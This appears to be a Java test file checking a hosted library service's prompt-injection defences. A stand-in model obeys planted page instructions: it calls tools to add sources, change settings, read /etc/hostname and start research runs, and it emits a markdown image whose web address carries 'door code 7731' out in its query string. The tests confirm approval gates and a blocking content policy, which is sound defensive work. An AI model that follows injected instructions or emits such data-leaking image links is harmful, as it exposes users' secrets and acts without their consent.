package org.researchzosho.librarian;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.researchzosho.Config;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.researchzosho.librarian.AccountServiceTest.Caller;
import static org.researchzosho.librarian.AccountServiceTest.enc;
import static org.researchzosho.librarian.AccountServiceTest.found;
import static org.researchzosho.librarian.AccountServiceTest.join;
import static org.researchzosho.librarian.AccountServiceTest.joinAsNew;

/**
 * The prompt-injection fixes in a library under an account service, through the service as a browser reaches it (0.8.0, round D): a
 * change to the library the chat's model asks for waits for the yes of a member who writes and is then done as that member; a reader's
 * chat is never asked and nothing is changed; a setting only the keeper sets is refused to a member at once, with nothing asked; and a
 * picture at an address on the web in the model's words is a link on the chat page the service serves, whose policy lets no picture of
 * the web in. The model is a stand-in that does what a page it read asked for.
 */
class InjectionHostedTest {
    static final ObjectMapper M = new ObjectMapper();
    static final String PLANTED = "PLANTED", PICTURE = "PICTURE";
    static final String BADGE = "![Tidewater Notes](https://img.example.net/badge.png?ctx=door%20code%207731)";
    AccountStore store; AccountService svc; Model model;

    /** A model that obeys the page it read: the tool a test names when the person's words carry PLANTED, a picture of the web when they carry PICTURE. */
    static final class Model implements AutoCloseable {
        final HttpServer server;
        volatile String tool = "", args = "{}";

        Model() throws IOException {
            server = HttpServer.create(new InetSocketAddress(InetAddress.getLoopbackAddress(), 0), 0);
            server.setExecutor(Executors.newCachedThreadPool());
            server.createContext("/", this::answer);
            server.start();
        }

        String url() { return "http://127.0.0.1:" + server.getAddress().getPort(); }

        private void answer(HttpExchange x) throws IOException {
            String path = x.getRequestURI().getPath();
            byte[] in = x.getRequestBody().readAllBytes();
            if (path.endsWith("/models")) { send(x, 200, "{\"object\":\"list\",\"data\":[{\"id\":\"stand-in\",\"object\":\"model\"}]}"); return; }
            if (!path.endsWith("/chat/completions")) { send(x, 404, "{}"); return; }
            JsonNode body = M.readTree(in), msgs = body.path("messages"), last = msgs.size() == 0 ? M.createObjectNode() : msgs.get(msgs.size() - 1);
            String said = last.path("content").isTextual() ? last.path("content").asText() : last.path("content").toString();
            boolean tools = body.path("tools").isArray() && body.path("tools").size() > 0;
            ObjectNode message = M.createObjectNode().put("role", "assistant");
            if (tools && "user".equals(last.path("role").asText()) && said.contains(PLANTED)) {
                message.putNull("content");
                message.putArray("tool_calls").addObject().put("id", "call_1").put("type", "function").putObject("function").put("name", tool).put("arguments", args);
            } else if ("tool".equals(last.path("role").asText())) message.put("content", "The library says what it does with that below.");
            else if (said.contains(PICTURE)) message.put("content", "The ferry ran from 1911 to 1968.\n\nPhotographs: " + BADGE);
            else message.put("content", "The ferry ran from 1911 to 1968.");
            ObjectNode out = M.createObjectNode().put("id", "c").put("object", "chat.completion").put("model", "stand-in");
            out.putArray("choices").addObject().put("index", 0).put("finish_reason", message.has("tool_calls") ? "tool_calls" : "stop").set("message", message);
            out.putObject("usage").put("prompt_tokens", 100).put("completion_tokens", 10).put("total_tokens", 110);
            send(x, 200, M.writeValueAsString(out));
        }

        private static void send(HttpExchange x, int status, String json) throws IOException {
            byte[] b = json.getBytes(StandardCharsets.UTF_8);
            x.getResponseHeaders().set("Content-Type", "application/json");
            x.sendResponseHeaders(status, b.length);
            try (OutputStream os = x.getResponseBody()) { os.write(b); }
        }

        @Override public void close() { server.stop(0); }
    }

    /** The libraries of the service in this process, on the stand-in model. */
    final class Here implements LibraryRunner {
        final String service; final Map<String, LibrarianDaemon> up = new ConcurrentHashMap<>();
        Here(String service) { this.service = service; }
        @Override public synchronized String ensure(AccountStore.Library lib) throws IOException {
            LibrarianDaemon d = up.get(lib.id());
            if (d == null) { d = LibrarianDaemon.start(new LibraryStore(Path.of(lib.folder()).resolve("library")), "127.0.0.1", 0, model.url(), "stand-in", -1, -1, new Vouching(service)); up.put(lib.id(), d); }
            return d.url();
        }
        @Override public void lost(String libraryId) { }
        @Override public void stopAll() { up.values().forEach(LibrarianDaemon::stop); up.clear(); }
    }

    void start(Path tmp) throws Exception {
        model = new Model();
        Config.set(AccountService.ROOT, tmp.resolve("accounts").toString());
        Config.set("RESEARCHZOSHO_DRIVE", model.url());
        Config.set("RESEARCHZOSHO_MODEL", "stand-in");
        store = AccountStore.open(AccountService.root().resolve("accounts.db").toString());
        svc = AccountService.start(store, "127.0.0.1", 0, Here::new);
    }

    @AfterEach void stop() throws Exception {
        if (svc != null) svc.stop();
        if (store != null) store.close();
        if (model != null) model.close();
        Config.set(AccountService.ROOT, ""); Config.set("RESEARCHZOSHO_DRIVE", ""); Config.set("RESEARCHZOSHO_MODEL", "");
    }

    /** Ann keeps a library, Ben reads it and Cat writes to it, each signed in in a browser of their own and in Ann's library. */
    record People(String library, Caller ann, Caller ben, Caller cat) { }

    People people() throws Exception {
        AccountService.Made ann = svc.newAccount("Ann Example", "", true, "the test"), ben = svc.newAccount("Ben Example", "", false, "the test");
        Caller a = join(svc, ann.code(), "ann's long password"), b = join(svc, ben.code(), "ben's long password");
        String lib = ann.library().id();
        HttpResponse<String> forBen = a.form("/account", "op=member-let-in&library=" + lib + "&name=" + enc("ben example") + "&level=read");
        assertEquals(303, b.form("/join", "code=" + enc(found(forBen.body(), "/join\\?code=([A-Za-z0-9_-]+)")) + "&op=take").statusCode());
        HttpResponse<String> forCat = a.form("/account", "op=member-let-in&library=" + lib + "&name=" + enc("Cat New") + "&level=write");
        Caller c = joinAsNew(svc, found(forCat.body(), "/join\\?code=([A-Za-z0-9_-]+)"), "Cat New", "cat's long password");
        assertEquals(303, b.form("/account", "op=open&library=" + lib).statusCode());
        assertEquals(lib, b.status().path("library_id").asText()); assertEquals(lib, c.status().path("library_id").asText());
        return new People(lib, a, b, c);
    }

    static String sources(Caller who) throws Exception {
        HttpResponse<String> r = who.json("/v1/sources", "{\"op\":\"list\"}");
        assertEquals(200, r.statusCode(), r.body());
        return r.body();
    }

    /** What every tool call of the library's conversations, the readers' among them, answered the model. */
    List<String> toolResults(String library) throws IOException {
        Path chats = Path.of(store.library(library).folder()).resolve("library").resolve("catalog").resolve("chat");
        List<String> out = new ArrayList<>();
        if (!Files.isDirectory(chats)) return out;
        try (Stream<Path> all = Files.walk(chats)) {
            for (Path f : all.filter(p -> p.toString().endsWith(".jsonl")).toList())
                for (String line : Files.readAllLines(f, StandardCharsets.UTF_8)) {
                    if (line.isBlank()) continue;
                    JsonNode m = M.readTree(line);
                    if ("tool".equals(m.path("role").asText())) out.add(m.path("name").asText() + ": " + m.path("content").asText());
                }
        }
        return out;
    }

    static final String ASKED = "The model asks to change this library: ";

    @Test
    void aChangeTheModelAsksForWaitsForAWritersYesAndAReaderIsNeverAsked(@TempDir Path tmp) throws Exception {
        start(tmp);
        People p = people();
        // a member who writes: the call waits for her yes, says what it would do, and her yes does it as her
        GivenAddresses.received("Our feeds: https://feeds.example.net/harbour and https://feeds.example.net/reader");   // the page the model read wrote them (the library opens only what it was given)
        model.tool = "library_sources"; model.args = "{\"op\":\"add\",\"address\":\"https://feeds.example.net/harbour\"}";
        assertEquals(303, p.cat().form("/chat", "say=" + enc(PLANTED + " What does this page say? https://example.net/page")).statusCode());
        String page = p.cat().get("/").body();
        assertTrue(page.contains(ASKED + "library_sources op=add address=https://feeds.example.net/harbour. Do it? (yes, no, or tell me more)"), "the library asks her: " + page);
        assertFalse(sources(p.ann()).contains("feeds.example.net/harbour"), "nothing is done before her answer");
        assertEquals(303, p.cat().form("/chat", "say=yes").statusCode());
        assertTrue(p.cat().get("/").body().contains("Done."), "her yes is answered");
        assertTrue(sources(p.ann()).contains("feeds.example.net/harbour"), "and the source is the library's now");

        // a reader: the same call is not asked about, nothing is changed, and the model is told nothing ran
        model.args = "{\"op\":\"add\",\"address\":\"https://feeds.example.net/reader\"}";
        assertEquals(303, p.ben().form("/chat", "say=" + enc(PLANTED + " What does this page say? https://example.net/page")).statusCode());
        String his = p.ben().get("/").body();
        assertTrue(his.contains("The library says what it does with that below."), "his turn was answered: " + his);
        assertFalse(his.contains(ASKED), "a reader is not asked: " + his);
        assertEquals(303, p.ben().form("/chat", "say=yes").statusCode());
        assertFalse(sources(p.ann()).contains("feeds.example.net/reader"), "nothing is changed");
        assertTrue(toolResults(p.library()).stream().anyMatch(r -> r.startsWith("library_sources: ") && r.contains("reads this library") && r.contains("ran nothing")), toolResults(p.library()).toString());

        // a setting only the keeper sets: refused to a member at once, with nothing asked
        model.tool = "library_settings"; model.args = "{\"op\":\"set\",\"name\":\"RESEARCHZOSHO_LANGUAGE\",\"value\":\"ja\"}";
        assertEquals(303, p.cat().form("/chat", "say=" + enc(PLANTED + " And this page? https://example.net/other")).statusCode());
        assertFalse(p.cat().get("/").body().contains(ASKED + "library_settings"), "not asked: only the keeper could say yes to it");
        assertTrue(toolResults(p.library()).stream().anyMatch(r -> r.startsWith("library_settings: ") && r.contains("The person who keeps this library sets how its reports are written.")), toolResults(p.library()).toString());
        // a file by its path on the service's machine: nobody's here, so the same
        model.tool = "library_add"; model.args = "{\"path\":\"/etc/hostname\"}";
        assertEquals(303, p.cat().form("/chat", "say=" + enc(PLANTED + " And this one? https://example.net/third")).statusCode());
        assertFalse(p.cat().get("/").body().contains(ASKED + "library_add"), "not asked: no yes could make it");
        assertTrue(toolResults(p.library()).stream().anyMatch(r -> r.startsWith("library_add: ") && r.contains("reads no file by its path")), toolResults(p.library()).toString());
    }

    @Test
    void aRunTheModelFilesForAWritingMemberWaitsForHerYesAndAReadersIsNeverAsked(@TempDir Path tmp) throws Exception {
        start(tmp);
        People p = people();
        LibraryStore lib = new LibraryStore(Path.of(store.library(p.library()).folder()).resolve("library"));
        model.tool = "library_research"; model.args = "{\"question\":\"Why did the Kestrel Sound ferry close?\"}";
        // a member who writes, asking only what a page says: the run the model files waits for her
        assertEquals(303, p.cat().form("/chat", "say=" + enc(PLANTED + " What does this page say? https://example.net/page")).statusCode());
        String page = p.cat().get("/").body();
        assertTrue(page.contains("The model asks to start a research run:") && page.contains("Why did the Kestrel Sound ferry close?"), "the library asks her: " + page);
        assertEquals(List.of(), new Jobs(lib, j -> "").active(), "no run before her answer");
        // her other words are more information: nothing is filed
        assertEquals(303, p.cat().form("/chat", "say=" + enc("only from the harbour board's own minutes")).statusCode());
        assertEquals(List.of(), new Jobs(lib, j -> "").active(), "more information files nothing");
        // proposed again, and her yes files it, as hers
        assertEquals(303, p.cat().form("/chat", "say=" + enc(PLANTED + " Then research it.")).statusCode());
        assertEquals(303, p.cat().form("/chat", "say=yes").statusCode());
        String after = p.cat().get("/").body();
        Matcher filed = Pattern.compile("Filed: (J-\\d+)\\.").matcher(after);
        assertTrue(filed.find(), "her yes is answered with the run: " + after);
        ObjectNode run = new Jobs(lib, j -> "").get(filed.group(1));
        assertEquals("Why did the Kestrel Sound ferry close?", run.path("args").path("question").asText());
        Patrons.Entry who = Patrons.byDid(lib, run.path("patron").asText());
        assertTrue(who != null && who.name().equals("Cat New") && who.level() == Patrons.Level.write, "filed as her: " + run + " " + who);
        // a reader: not asked, and his model's call runs nothing
        assertEquals(303, p.ben().form("/chat", "say=" + enc(PLANTED + " What does this page say? https://example.net/page")).statusCode());
        assertFalse(p.ben().get("/").body().contains("The model asks to"), "a reader is not asked");
        assertEquals(303, p.ben().form("/chat", "say=yes").statusCode());
        assertTrue(toolResults(p.library()).stream().anyMatch(r -> r.startsWith("library_research: ") && r.contains("reads this library") && r.contains("ran nothing")), toolResults(p.library()).toString());
    }

    @Test
    void aPictureOfTheWebInTheModelsWordsIsALinkOnTheServicesChatPage(@TempDir Path tmp) throws Exception {
        start(tmp);
        People p = people();
        assertEquals(303, p.cat().form("/chat", "say=" + enc(PICTURE + " What does this page say? https://example.net/page")).statusCode());
        // the conversation opened again, as the service serves it
        HttpResponse<String> again = p.cat().get("/");
        assertEquals(200, again.statusCode());
        assertTrue(again.body().contains("The ferry ran from 1911 to 1968."), again.body());
        assertFalse(again.body().contains("src=\"https://img.example.net"), "the model's picture is not loaded: " + again.body());
        assertTrue(again.body().contains("https://img.example.net/badge.png?ctx=door%20code%207731"), "its address is shown, as text");
        String policy = again.headers().firstValue("Content-Security-Policy").orElse("");
        assertTrue(policy.contains("img-src 'self';"), "no picture of the web is let in: " + policy);
    }
}
